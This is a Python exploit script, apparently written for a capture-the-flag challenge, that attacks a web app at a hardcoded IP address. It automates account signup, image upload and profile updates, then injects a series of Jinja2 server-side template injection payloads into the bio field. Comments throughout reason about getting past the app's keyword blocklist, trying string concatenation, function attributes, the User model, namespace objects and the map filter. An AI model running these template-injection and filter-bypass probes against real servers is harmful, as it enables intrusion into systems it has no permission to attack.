#!/usr/bin/env python3
import requests
from PIL import Image
import io
import re
import random

BASE_URL = "http://94.237.56.175:48466"

def exploit_with_payload(payload):
    """Exploit with a specific payload"""
    session = requests.Session()
    username = f"pwn{random.randint(1000, 9999)}"
    
    # Setup account
    session.post(f"{BASE_URL}/signup", data={'email': f'{username}@test.com', 'username': username, 'password': 'pass'})
    session.post(f"{BASE_URL}/login", data={'username': username, 'password': 'pass'})
    
    # Upload image
    img = Image.new('RGB', (100, 100))
    buf = io.BytesIO()
    img.save(buf, format='JPEG')
    buf.seek(0)
    session.post(f"{BASE_URL}/verification", files={'file': ('b.jpg', buf, 'image/jpeg')})
    
    # Set bio
    r = session.post(f"{BASE_URL}/profile", data={'bio': payload})
    if "Bio updated" not in r.text:
        return None, "Blocked by filter"
    
    # Get result
    session.get(f"{BASE_URL}/getlink")
    r = session.get(f"{BASE_URL}/user/{username}")
    
    if r.status_code != 200:
        return None, f"Error {r.status_code}"
    
    match = re.search(r'<p class="para-class">(.*?)</p>', r.text, re.DOTALL)
    return (match.group(1).strip() if match else ""), "Success"

print("[*] Testing bypass techniques...\n")

# Test 1: Can we build strings to bypass the filter?
# The filter checks if blocked strings are IN the bio, so we can't just concatenate in Jinja2
# because the full template string "{{..}}" is checked before rendering

# Let's verify this:
print("Test 1: String concatenation bypass")
result, status = exploit_with_payload("{{ 'at' ~ 'tr' }}")
print(f"  Status: {status}, Result: '{result}'")

# The issue is that the checkInput function runs BEFORE Jinja2 rendering
# So concatenation won't help us bypass the filter

# Alternative approach: Use object methods that don't require blocked keywords
# For example: lipsum.func_code, lipsum.func_closure, etc. (Python 2)
# Or: lipsum.__code__, lipsum.__closure__, etc. (Python 3) - but needs __

# Let's try using getattr equivalent - but 'attr' is blocked!

# Wait! Let's check if we can use filter syntax with ()|attr('')
# We can pass the attribute name as a string!

# Actually, looking at the filter again, it blocks the string "attr" anywhere
# So |attr(...) won't work

# Let me try a completely different approach: 
# Use lipsum or other functions and their properties that don't need __

print("\nTest 2: Trying function properties")
tests = [
    ("lipsum.func_code", "{{ lipsum.func_code }}"),
    ("lipsum.func_closure", "{{ lipsum.func_closure }}"),
    ("get_flashed_messages gi_code", "{{ get_flashed_messages.gi_code }}"),
]

for desc, payload in tests:
    result, status = exploit_with_payload(payload)
    print(f"  {desc}: {status} - '{result[:80] if result else ''}'")

# Hmm, in Python 3 these are __code__, __closure__, etc.

# Let's try yet another approach: exploiting the User model!
# User is a SQLAlchemy model, maybe we can use it to execute queries or access the file system?

print("\nTest 3: Exploiting User model")
user_tests = [
    ("User.query", "{{ User.query }}"),
    ("User.metadata", "{{ User.metadata }}"),
]

for desc, payload in user_tests:
    result, status = exploit_with_payload(payload)
    print(f"  {desc}: {status} - '{result[:100] if result else ''}'")

#  Let me try using the 'namespace' object or creating objects differently
print("\nTest 4: Creating namespace and exploring")
ns_tests = [
    ("namespace()", "{{ namespace() }}"),
    ("namespace().x", "{{ namespace(x=lipsum) }}"),
]

for desc, payload in ns_tests:
    result, status = exploit_with_payload(payload)
    print(f"  {desc}: {status} - '{result[:100] if result else ''}'")

# OK new idea: What if we use Python's ability to call methods using getattr?
# But we need to avoid the word "attr"...

# WAIT! What about using the |map filter or |select filter?
# These aren't in the blocklist!

print("\nTest 5: Using map/select filters")
map_tests = [
    ("map test", "{{ dict|map }}"),
    ("list map", "{{ (1,2,3)|map }}"),
]

for desc, payload in map_tests:
    result, status = exploit_with_payload(payload)
    print(f"  {desc}: {status} - '{result[:100] if result else ''}'")

print("\n" + "="*80)
print("Analyzing results to find the next approach...")
print("="*80)
